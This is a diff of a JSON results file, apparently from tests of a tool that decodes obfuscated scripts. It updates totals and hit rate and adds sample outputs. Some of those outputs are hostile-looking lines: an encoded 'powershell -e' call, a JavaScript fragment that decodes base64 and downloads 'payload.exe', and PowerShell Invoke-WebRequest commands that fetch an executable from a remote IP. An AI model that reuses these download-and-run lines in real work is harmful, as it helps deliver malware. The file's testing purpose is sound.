@@ -1,7 +1,7 @@
 {
-  "total": 70,
+  "total": 81,
   "passed": 27,
-  "hit_rate": 0.3857,
+  "hit_rate": 0.3333,
   "threshold": 0.6,
   "results": [
     {
@@ -339,9 +339,9 @@
     },
     {
       "sha1": "5fd384bfadd38c3f124a8f654b47c069ee55dde9",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "\u00ff\u0000",
+      "output_head": "powershell -e ABC",
       "ok": false
     },
     {
@@ -390,9 +390,9 @@
     },
     {
       "sha1": "a3000b7c7aac53570a950f75827a60847132ed73",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "binary-A",
+      "output_head": "var d='YmluYXJ5LUE=';        var b=atob(d);        var l=document.createElement('a');        l.download='payload.exe';  ",
       "ok": false
     },
     {
@@ -411,9 +411,9 @@
     },
     {
       "sha1": "f9f75777c6ec5ce767f90a3564eba599398a4d58",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "binary-A",
+      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
       "ok": false
     },
     {
@@ -756,9 +756,86 @@
     },
     {
       "sha1": "157fa2cf7908b959ec6cae7b4ca0e8463f2777c3",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "--runaszvideo=TRUE --useroption=2347222064534913024 --useroption2=1152956688981395520 --useroption3=6917600633341970944 ",
+      "ok": false
+    },
+    {
+      "sha1": "edf427c8eadff87348a1965681f7d5348c68a601",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "FuturePrint\\Windows\\menu\\menu_En.exe x64",
+      "ok": false
+    },
+    {
+      "sha1": "4514cea4027c959ea08982e1d1bad05af56e1adb",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "# vendor=Cisco XDR\nevent[0] host=AZG51 user=User path=menu_En.exe detection=Alert threat=high",
+      "ok": false
+    },
+    {
+      "sha1": "bd907aa2280549494055de165f6230d94ce69af1",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "just some text",
+      "ok": false
+    },
+    {
+      "sha1": "2dbb56915aff141470bfa3346d468e40a514f5fe",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "test 12345",
+      "ok": false
+    },
+    {
+      "sha1": "5d0e284372faf08e9d483f6fa208e7110fe8e2fd",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "powershell -c \"Invoke-WebRequest -Uri http://8.8.8.8/x -OutFile a.exe\"",
+      "ok": false
+    },
+    {
+      "sha1": "abe8fc0b05effd3fd219bb44f6400e9c2bc1048c",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "powershell -c \"Invoke-WebRequest -Uri http://8.8.8.8/a -OutFile a.exe\"",
+      "ok": false
+    },
+    {
+      "sha1": "eff48a804a64094c59a678ca55f96a198a9a30cf",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "Get-Process | Where-Object { $_.CPU -gt 100 }",
+      "ok": false
+    },
+    {
+      "sha1": "3ddb8ca1b50e240736bb4b86fdff00ffc79d8c47",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "ipconfig /all",
+      "ok": false
+    },
+    {
+      "sha1": "1e496735e9224be745ac5c094245888cb37c546c",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "# vendor=CrowdStrike Falcon\nevent[0] host=WKST-014 user=corp\\jdoe detection=DetectionSummaryEvent",
+      "ok": false
+    },
+    {
+      "sha1": "23378e603f5a4d362d80e25c8bfacaf8b39d6ac6",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "# vendor=Cisco Secure Endpoint\nevent[0] user=alice",
+      "ok": false
+    },
+    {
+      "sha1": "ca1cc8941071fd8ef90f6fcc757a7f0bd0c60151",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "powershell -NoProfile Write-Host \"Decoder Validation\"",
       "ok": false
     }
   ]
